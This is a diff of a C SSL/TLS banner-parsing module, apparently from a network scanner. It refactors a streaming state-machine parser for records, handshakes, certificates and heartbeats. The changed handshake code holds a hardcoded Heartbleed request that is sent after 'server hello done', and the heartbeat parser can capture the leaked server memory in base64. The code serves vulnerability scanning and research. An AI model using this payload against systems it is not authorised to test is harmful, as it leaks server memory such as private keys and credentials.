@@ -1,17 +1,50 @@
 /*
     SSL parser
+ 
+    This parses SSL packets from the server. It is built in multiple levels:
+ 
+    RECORDS
+      |
+      +---> heartbeat
+      |        |
+      |        +---> banner grab
+      |
+      +---> handshake
+               |
+               +---> server hello
+               |        |
+               |        +---> banner grab
+               |
+               +---> certificate
+                        |
+                        +---> X.509 parser
+                                 |
+                                 +---> subject name (banner)
+                                 |
+                                 +---> certificate (banner)
+ 
 
-    This parses out the SSL "certificate" and "ephemeral keys", and
-    any other information we want from SSL.
-
+    For "heartbeat", we grab the so-called "heartbleed" exploit info.
+    For "server hello", we grab the "subject name" of the server.
+    For "certificate", we grab the certificate
+ 
+ 
     !!!!!!!!!!!!  BIZARRE CODE ALERT !!!!!!!!!!!!!!!
     
-    This module uses "state-machines" to parse
-    SSL. This has a number of advantages, such as handling TCP
-    segmentation and SSL record fragmentation without having to
-    buffer any packets. But it's quite weird if you aren't used to
-    it.
-*/
+    This module uses a "streaming state-machine" to parse the SSL protocol.
+    In other words, this does not "reasemble" fragments. Instead, it allows
+    state to cross packet-boundaries. Thus, it supports both fragmentation
+    at the TCP layer and the SSL record layer, but without reassembling
+    things. Only in the output, in the gathered "banners", does reassembly
+    happen -- in other words, reassembly happens after OSI Layer 7 rather
+    than OSI Layer 4.
+ 
+    As many are unfamiliar with this technique, they'll find it a little
+    weird.
+ 
+    The upshot of doing things this way is that we can support 10 million
+    open TCP connections with minimal memory usage.
+ */
 #include "proto-ssl.h"
 #include "proto-interactive.h"
 #include "unusedparm.h"
@@ -28,13 +61,14 @@
 #define DROPDOWN(i,length,state) (state)++;if (++(i)>=(length)) break
 
 
-/***************************************************************************
- * This parses the "Server Hello" packet, the packet that comes before 
- * certificates. What we want from this are the SSL version info and the
- * "cipher-suite" (which encryption protocol the server uses).
- ***************************************************************************/
+/*****************************************************************************
+ * This parses the "Server Hello" packet, the response to our "ClientHello"
+ * that we sent. We are looking for the following bits of information:
+ *  - cipher chosen by the server
+ *  - whether heartbeats are enabled
+ *****************************************************************************/
 static void
-server_hello(
+parse_server_hello(
         const struct Banner1 *banner1,
         void *banner1_private,
         struct ProtocolState *pstate,
@@ -65,7 +99,7 @@ server_hello(
     UNUSEDPARM(banner1_private);
     UNUSEDPARM(banner1);
 
-    /* What this structure looks like
+    /* What this structure looks like in ASN.1 format
        struct {
            ProtocolVersion server_version;
            Random random;
@@ -110,6 +144,8 @@ server_hello(
         DROPDOWN(i,length,state);
     case RANDOM:
         {
+            /* do our typical "skip" logic to skip this
+             * 32 byte field */
             unsigned len = (unsigned)length-i;
             if (len > remaining)
                 len = remaining;
@@ -242,10 +278,36 @@ server_hello(
 }
 
 
-/***************************************************************************
- ***************************************************************************/
+/*****************************************************************************
+ * This parses the certificates from the server. Thise contains an outer
+ * length field for all certificates, and then uses a length field for
+ * each certificate. The length fields are 3 bytes long.
+ *
+ * +--------+--------+--------+
+ * |  length of all certs     |
+ * +--------+--------+--------+
+ *    +--------+--------+--------+
+ *    |        cert length       |
+ *    +--------+--------+--------+
+ *    .                          .
+ *    . . .    certificate   . . .
+ *    .                          .
+ *    +--------+--------+--------+
+ *    |        cert length       |
+ *    +--------+--------+--------+
+ *    .                          .
+ *    . . .    certificate   . . .
+ *    .                          .
+ *
+ * This parser doesn't parse the certificates themselves, but initializes
+ * and passes fragments to the X.509 parser.
+ *
+ * Called by ssl_parser_record()->parse_handshake()
+ * Calls x509_decode() to parse the certificate
+ * Calls banout_append_base64() to capture the certificate
+ *****************************************************************************/
 static void
-server_cert(
+parse_server_cert(
         const struct Banner1 *banner1,
         void *banner1_private,
         struct ProtocolState *pstate,
@@ -295,7 +357,7 @@ server_cert(
         cert_remaining = cert_remaining * 256 + px[i];
         remaining--;
         if (banner1->is_capture_cert) {
-            banout_init_base64(&data->sub.base64);
+            banout_init_base64(&pstate->base64);
             banout_append(  banout, PROTO_X509_CERT, "cert:", 5);
         }
 
@@ -316,7 +378,7 @@ server_cert(
                 banout_append_base64(banout, 
                              PROTO_X509_CERT, 
                              px+i, len,
-                             &data->sub.base64);
+                             &pstate->base64);
             }
 
             x509_decode(&data->x509, px+i, len, banout);
@@ -331,7 +393,9 @@ server_cert(
                 /* We've reached the end of the certificate, so make
                  * a record of it */
                 if (banner1->is_capture_cert) {
-                    banout_finalize_base64(banout, PROTO_X509_CERT, &data->sub.base64);        
+                    banout_finalize_base64(banout, 
+                                           PROTO_X509_CERT, 
+                                           &pstate->base64);        
                     banout_end(banout, PROTO_X509_CERT);
                 }
                 state = CLEN0;
@@ -350,10 +414,33 @@ server_cert(
     data->sub.remaining = cert_remaining;
 }
 
-/***************************************************************************
- ***************************************************************************/
+/*****************************************************************************
+ * Called from the SSL Record parser to parse the contents of
+ * a handshake record. The way SSL handshaking works is that after we
+ * have sent the "hello", the server then sends us a bunch of records,
+ * including its certificate, then is done on their side with the handshake.
+ * Then, the client sends a bunch of stuff, to complete their end of the
+ * handshake (which we won't do). At that point, they then do a "change
+ * cipher spec" to negotiate the encryption keys, which isn't technically
+ * part of the handshaking.
+ *
+ * This is a four byte protocol:
+ * +--------+
+ * |  type  |
+ * +--------+--------+--------+
+ * |          length          |
+ * +--------+--------+--------+
+ * |  content ...
+ * .
+ * .
+ *
+ * Note that the "length" field is 3 bytes, supporting in theory 16-megs
+ * of content, but the outer record that calls this uses only 2-byte length
+ * fields. That's because records support fragmentation. This parser supports
+ * this fragmentation -- the 'state' variable crosses fragment boundaries.
+ *****************************************************************************/
 static void
-handshake_parse(
+parse_handshake(
         const struct Banner1 *banner1,
         void *banner1_private,
         struct ProtocolState *pstate,
@@ -362,8 +449,8 @@ handshake_parse(
         struct InteractiveData *more)
 {
     struct SSLRECORD *ssl = &pstate->sub.ssl;
-    unsigned state = ssl->record.state;
-    unsigned remaining = ssl->record.remaining;
+    unsigned state = ssl->handshake.state;
+    unsigned remaining = ssl->handshake.remaining;
     unsigned i;
     enum {
         START,
@@ -372,77 +459,99 @@ handshake_parse(
         UNKNOWN,
     };
 
+    /*
+     * `for all bytes in the segment`
+     *   `do a state transition for that byte `
+     */
     for (i=0; i<length; i++)
     switch (state) {
+            
+    /* There are 20 or so handshaking sub-messages, indicates by it's own
+     * 'type' field, which we parse out here */
     case START:
         if (px[i] & 0x80) {
             state = UNKNOWN;
             break;
         }
-        remaining = 0;
-        ssl->record.type = px[i];
+        /* remember the 'type' field for use later in the CONTENT state */
+        ssl->handshake.type = px[i];
+        
+        /* initialize the state variable that will be used by the inner
+         * parsers */
         ssl->x.all.state = 0;
         DROPDOWN(i,length,state);
 
+    /* This grabs the 'length' field. Note that unlike other length fields,
+     * this one is 3 bytes long. That's because a single certificate 
+     * packet can contain so many certificates in a chain that it exceeds
+     * 64k kilobytes in size. */
     case LENGTH0:
         remaining = px[i];
         DROPDOWN(i,length,state);
-
     case LENGTH1:
         remaining <<= 8;
         remaining |= px[i];
         DROPDOWN(i,length,state);
-
     case LENGTH2:
         remaining <<= 8;
         remaining |= px[i];
 
-        /* Process the start of some fields. In particular, the "hello done"
-         * packet has a zero length, so we never drop down in the CONTENTS
-         * state, so we have to process it here */
-        switch (ssl->record.type) {
-        case 0x02: /* hello done */
-             {
-                    static const char heartbleed_request[] = 
-                    "\x15\x03\x02\x00\x02\x01\x80"
-                    "\x18\x03\x02\x00\x03\x01" "\x40\x00";
-                more->payload = heartbleed_request;
-                more->length = sizeof(heartbleed_request)-1;
-             }
-             break;
+        /* If we get a "server done" response, then it's a good time to
+         * send the heartbleed request. Note that these are usually zero
+         * length, so we can't process this below in the CONTENT state
+         * but have to do it here at the end of the LENGTH2 state */
+        if (ssl->handshake.type == 2) {
+            static const char heartbleed_request[] = 
+                "\x15\x03\x02\x00\x02\x01\x80"
+                "\x18\x03\x02\x00\x03\x01" "\x40\x00";
+            more->payload = heartbleed_request;
+            more->length = sizeof(heartbleed_request)-1;
         }
         DROPDOWN(i,length,state);
 
+    /* This parses the contents of the handshake. This parser just skips
+     * the data, in the same way as explained in the "ssl_parse_record()"
+     * function at its CONTENT state. We may pass the fragment to an inner
+     * parser, but whatever the inner parser does is independent from this
+     * parser, and has no effect on this parser
+     */
     case CONTENTS:
         {
             unsigned len = (unsigned)length-i;
             if (len > remaining)
                 len = remaining;
 
-
-            
-            switch (ssl->record.type) {
-            case 0x02: /* server hello */
-                server_hello(      banner1,
-                                    banner1_private,
-                                    pstate,
-                                    px+i, len,
-                                    banout,
-                                    more);
-                break;
-            case 0x0b: /* server certificate */
-                server_cert(        banner1,
-                                    banner1_private,
-                                    pstate,
-                                    px+i, len,
-                                    banout);
-                break;
-            case 0x0c: /* key exchange */
-                break;
-            case 0x0e: /* hello done */
-                break;
-            default:
-                ;
+            switch (ssl->handshake.type) {
+                case 0: /* hello request*/
+                case 1: /* client hello */
+                case 3: /* DTLS hello verify request */
+                case 4: /* new session ticket */
+                case 12: /* server key exchange */
+                case 13: /* certificate request */
+                case 14: /* server done */
+                case 15: /* certificate verify */
+                case 16: /* client key exchange */
+                case 20: /* finished */
+                case 22: /* certificate status */
+                default:
+                    /* don't parse these types, just skip them */
+                    break;
+                    
+                case 2: /* server hello */
+                    parse_server_hello( banner1,
+                                       banner1_private,
+                                       pstate,
+                                       px+i, len,
+                                       banout,
+                                       more);
+                    break;
+                case 11: /* server certificate */
+                    parse_server_cert(  banner1,
+                                      banner1_private,
+                                      pstate,
+                                      px+i, len,
+                                      banout);
+                    break;
             }
 
             remaining -= len;
@@ -458,12 +567,26 @@ handshake_parse(
         i = (unsigned)length;
     }
 
-    ssl->record.state = state;
-    ssl->record.remaining = remaining;
+    ssl->handshake.state = state;
+    ssl->handshake.remaining = remaining;
 }
 
+
+/*****************************************************************************
+ * Called to parse the "hearbeat" data. This consists of the following 
+ * structure:
+ *
+ * +--------+
+ * |  type  | 1=request, 2=response
+ * +--------+--------+
+ * |      length     |
+ * +--------+--------+
+ *
+ * This is followed by the echoed bytes, followed by some padding.
+ *
+ *****************************************************************************/
 static void
-nothandshake_parse(
+parse_heartbeat(
         const struct Banner1 *banner1,
         void *banner1_private,
         struct ProtocolState *pstate,
@@ -472,8 +595,8 @@ nothandshake_parse(
         struct InteractiveData *more)
 {
     struct SSLRECORD *ssl = &pstate->sub.ssl;
-    unsigned state = ssl->record.state;
-    unsigned remaining = ssl->record.remaining;
+    unsigned state = ssl->handshake.state;
+    unsigned remaining = ssl->handshake.remaining;
     unsigned i;
     enum {
         START,
@@ -485,82 +608,116 @@ nothandshake_parse(
     UNUSEDPARM(more);
     UNUSEDPARM(banner1_private);
 
+    /*
+     * `for all bytes in the segment`
+     *   `do a state transition for that byte `
+     */
     for (i=0; i<length; i++)
     switch (state) {
+            
+    /* this is the 'type' field for the hearbeat. There are only two
+     * values, '1' for request and '2' for response. Anything else indicates
+     * that either the data was corrupted, or else it is encrypted.
+     */
     case START:
-        if (px[i] & 0x80) {
+        if (px[i] < 1 || 2 < px[i]) {
             state = UNKNOWN;
             break;
         }
-        remaining = 0;
-        ssl->record.type = px[i];
-        ssl->x.all.state = 0;
+        ssl->handshake.type = px[i];
         DROPDOWN(i,length,state);
 
+    /* Grab the two byte length field */
     case LENGTH0:
         remaining = px[i];
         DROPDOWN(i,length,state);
-
     case LENGTH1:
         remaining <<= 8;
         remaining |= px[i];
         
-        switch (ssl->record.type) {
-        case 0x02:
-            if (remaining >= 1) {
+        /* `if heartbeat response ` */
+        if (ssl->handshake.type == 2) {
+            
+            /* if we have a non-trivial amount of data in the response, then
+             * it means the "bleed" attempt succeeded. */
+            if (remaining >= 16)
                 banout_append(  banout, PROTO_VULN, "SSL[HEARTBLEED] ", 16);
-            }
-
+            
+            /* if we've been configured to "capture" the heartbleed contents,
+             * then initialize the BASE64 encoder */
             if (banner1->is_capture_heartbleed) {
-                banout_init_base64(&pstate->sub.ssl.x.server_cert.sub.base64);
+                banout_init_base64(&pstate->base64);
                 banout_append(banout, PROTO_HEARTBLEED, "", 0);
             }
         }
         DROPDOWN(i,length,state);
 
+    /* Here is where we parse the contents of the heartbeat. This is the same
+     * skipping logic as the CONTENTS state within the ssl_parse_record()
+     * function.*/
     case CONTENTS:
         {
             unsigned len = (unsigned)length-i;
             if (len > remaining)
                 len = remaining;
 
-            switch (ssl->record.type) {
-            case 0x02: /* heartbeat */
-                if (banner1->is_capture_heartbleed) {
-                    banout_append_base64(banout, 
-                                 PROTO_HEARTBLEED, 
-                                 px+i, len,
-                                 &pstate->sub.ssl.x.server_cert.sub.base64);
-                }
-                break;
-            default:
-                //printf("unknown SSL record: 0x%02x\n", ssl->record.type);
-                ;
+            /* If this is a RESPONSE, and we've been configured to CAPTURE
+             * hearbleed responses, then we write the bleeding bytes in 
+             * BASE64 into the banner system. The user will be able to 
+             * then do research on those bleeding bytes */
+            if (ssl->handshake.type == 2 && banner1->is_capture_heartbleed) {
+                banout_append_base64(banout, 
+                                     PROTO_HEARTBLEED, 
+                                     px+i, len,
+                                     &pstate->base64);
             }
 
             remaining -= len;
             i += len-1;
 
             if (remaining == 0)
-                state = START;
+                state = UNKNOWN; /* padding */
         }
 
         break;
+    
+    /* We reach this state either because the hearbeat data is corrupted or
+     * encrypted, or because we've reached the padding area after the 
+     * heartbeat */
     case UNKNOWN:
     default:
         i = (unsigned)length;
     }
 
-    ssl->record.state = state;
-    ssl->record.remaining = remaining;
+    /* not the handshake protocol, but we re-use their variables */
+    ssl->handshake.state = state;
+    ssl->handshake.remaining = remaining;
 }
 
-/***************************************************************************
- * Parse just the outer record, then hands down the contents to the
- * sub parser at "handshake_parse()"
- ***************************************************************************/
+/*****************************************************************************
+ * This is the main SSL parsing function.
+ *
+ * SSL is a multi-layered protocol, consisting of "Records" as the outer
+ * protocol, with records containing data inside. The inner data is
+ * unencrypted during the session handshake, but then encrypted from then on.
+ *
+ * The SSL Records are a simple 5 byte protocol:
+ *
+ * +--------+
+ * |  type  |
+ * +--------+--------+
+ * |ver-mjr |ver-mnr |
+ * +--------+--------+
+ * |      length     |
+ * +--------+--------+
+ *
+ * This allows simple state-machine parsing. We need only 6 states, one for
+ * each byte, and then a "content" state tracking the contents of the recod
+ * until we've parsed "length" bytes, then back to the initial state.
+ *
+ *****************************************************************************/
 static void
-ssl_parse(
+ssl_parse_record(
         const struct Banner1 *banner1,
         void *banner1_private,
         struct ProtocolState *pstate,
@@ -582,80 +739,129 @@ ssl_parse(
     };
 
     /*
-    for (i=0; i<length && i<8; i++) {
-        printf("%02x ", px[i]);
-    }
-    printf("                                \n");
-    */
-
+     * `for all bytes in the segment`
+     *   `do a state transition for that byte `
+     */
     for (i=0; i<length; i++)
     switch (state) {
+            
+    /* 
+     * The initial state parses the "type" byte. There are only a few types
+     * defined so far, the values 20-25, but more can be defined in the 
+     * future. The standard explicity says that they must be lower than 128,
+     * so if the high-order bit is set, we know that the byte is invalid,
+     * and that something is wrong.
+     */
     case START:
         if (px[i] & 0x80) {
             state = UNKNOWN;
             break;
         }
-        if (ssl->content_type != px[i]) {
-            ssl->content_type = px[i];
-            ssl->record.state = 0;
+        if (ssl->type != px[i]) {
+            ssl->type = px[i];
+            
+            /* this is for some minimal fragmentation/reassembly */
+            ssl->handshake.state = 0;
         }
-        remaining = 0;
         DROPDOWN(i,length,state);
 
+    /* This is the major version number, which must be the value '3',
+     * which means both SSLv3 and TLSv1. This parser doesn't support
+     * earlier versions of SSL. */
     case VERSION_MAJOR:
+        if (px[i] != 3) {
+            state = UNKNOWN;
+            break;
+        }
         ssl->version_major = px[i];
         DROPDOWN(i,length,state);
 
+    /* This is the minor version number. It's a little weird:
+     * 0 = SSLv3.0
+     * 1 = TLSv1.0
+     * 2 = TLSv1.1
+     * 3 = TLSv1.2
+     */
     case VERSION_MINOR:
         ssl->version_minor = px[i];
         DROPDOWN(i,length,state);
 
+    /* This is the length field. In theory, it can be the full 64k bytes
+     * in length, but typical implements limit it to 16k */
     case LENGTH0:
         remaining = px[i]<<8;
         DROPDOWN(i,length,state);
-
     case LENGTH1:
         remaining |= px[i];
         DROPDOWN(i,length,state);
-        ssl->record.state = 0;
+        ssl->handshake.state = 0;
         
-
+    /*
+     * This state parses the "contents" of a record. What we do here is at
+     * this level of the parser is that we calculate a sub-segment size,
+     * which is bounded by either the number of bytes in this records (when
+     * there are multiple records per packet), or the packet size (when the
+     * record exceeds the size of the packet).
+     * We then pass this sug-segment to the inner content parser. However, the
+     * inner parser has no effect on what happens in this parser. It's wholy
+     * indpedent, doing it's own thing.
+     */
     case CONTENTS:
         {
-            unsigned len = (unsigned)length - i;
+            unsigned len;
+            
+            /* Size of this segment is either the bytes remaining in the 
+             * current packet, or the bytes remaining in the record */
+            len = (unsigned)length - i;
             if (len > remaining)
                 len = remaining;
 
-            /*
-             * Parse the contents of a record
-             */
-            switch (ssl->content_type) {
-            case 22: /* Handshake protocol */
-                handshake_parse(banner1,
-                                banner1_private,
-                                pstate,
-                                px+i, len,
-                                banout,
-                                more);
-                break;
-            case 24:
-                nothandshake_parse(banner1,
-                                banner1_private,
-                                pstate,
-                                px+i, len,
-                                banout,
-                                more);
-                break;
+            /* Do an inner-parse of this segment. Note that the inner-parser
+             * has no effect on this outer record parser */
+            switch (ssl->type) {
+                case 20: /* change cipher spec */
+                    break;
+                case 21: /* alert */
+                    /* encrypted, usually */
+                    break;
+                case 22: /* handshake */
+                    parse_handshake(banner1,
+                                    banner1_private,
+                                    pstate,
+                                    px+i, len,
+                                    banout,
+                                    more);
+                    break;
+                case 23: /* application data */
+                    /* encrypted, always*/
+                    break;
+                case 24: /* heartbeat */
+                    /* enrypted, in theory, but not practice */
+                    parse_heartbeat(banner1,
+                                    banner1_private,
+                                    pstate,
+                                    px+i, len,
+                                    banout,
+                                    more);
+                    break;
             }
-
+            
+            /* Skip ahead the number bytes in this segment. This makes the
+             * parser very fast, because we aren't actually doing a single
+             * byte at a time, but skipping forward large number of bytes
+             * at a time -- except for the 5 byte headers */
             remaining -= len;
-            i += len-1;
-
+            i += len-1; /* if 'len' is zero, this still works */
+            
+            /* Once we've exhausted the contents of record, go back to the
+             * start parsing the next record */
             if (remaining == 0)
                 state = START;
         }
-
         break;
+            
+    /* We reach the state when the protocol has become corrupted, such as in
+     * those cases where it's not SSL */
     case UNKNOWN:
     default:
         i = (unsigned)length;
@@ -665,8 +871,13 @@ ssl_parse(
     pstate->remaining = remaining;
 }
 
-/***************************************************************************
- ***************************************************************************/
+
+/*****************************************************************************
+ * This is called at program startup to initialize any structures we need
+ * for parsing. The SSL parser doesn't need anything in particular, so
+ * we just ignore it. We have to implement the callback, however, which
+ * is why this empty function exists.
+ *****************************************************************************/
 static void *
 ssl_init(struct Banner1 *banner1)
 {
@@ -674,8 +885,13 @@ ssl_init(struct Banner1 *banner1)
     return 0;
 }
 
-/***************************************************************************
- ***************************************************************************/
+/*****************************************************************************
+ * This is the template "Client Hello" packet that is sent to the server
+ * to initiate the SSL connection. Right now, it's statically just transmitted
+ * on to the wire.
+ * TODO: we need to make this dynamically generated, so that users can
+ * select various options.
+ *****************************************************************************/
 static const char
 ssl_hello[] =
 "\x16\x03\x02\x01\x6f"          /* TLSv1.1 record layer */
@@ -766,8 +982,8 @@ extern unsigned char ssl_test_case_3[];
 extern size_t ssl_test_case_3_size;
 
 
-/***************************************************************************
- ***************************************************************************/
+/*****************************************************************************
+ *****************************************************************************/
 static int
 ssl_selftest(void)
 {
@@ -776,7 +992,7 @@ ssl_selftest(void)
     unsigned ii;
     struct BannerOutput banout1[1];
     struct BannerOutput banout2[1];
-
+    struct InteractiveData more;
 
     /*
      * Do the normal parse
@@ -785,13 +1001,13 @@ ssl_selftest(void)
     banner1->is_capture_cert = 1;
     memset(state, 0, sizeof(state));
     banout_init(banout1);
-    ssl_parse(  banner1,
+    ssl_parse_record(  banner1,
                 0,
                 state,
                 ssl_test_case_3,
                 ssl_test_case_3_size,
                 banout1,
-                0
+                &more
                 );
     banner1_destroy(banner1);
     banout_release(banout1);
@@ -804,13 +1020,13 @@ ssl_selftest(void)
     memset(state, 0, sizeof(state));
     banout_init(banout2);
     for (ii=0; ii<ssl_test_case_3_size; ii++)
-    ssl_parse(  banner1,
+    ssl_parse_record(  banner1,
                 0,
                 state,
                 (const unsigned char *)ssl_test_case_3+ii,
                 1,
                 banout2,
-                0
+                &more
                 );
     banner1_destroy(banner1);
     banout_release(banout2);
@@ -854,12 +1070,14 @@ ssl_selftest(void)
     return 0;
 }
 
-/***************************************************************************
- ***************************************************************************/
+/*****************************************************************************
+ * This is the 'plugin' structure that registers callbacks for this parser in
+ * the main system.
+ *****************************************************************************/
 struct ProtocolParserStream banner_ssl = {
     "ssl", 443, ssl_hello, sizeof(ssl_hello)-1, 0,
     ssl_selftest,
     ssl_init,
-    ssl_parse,
+    ssl_parse_record,
 };
 
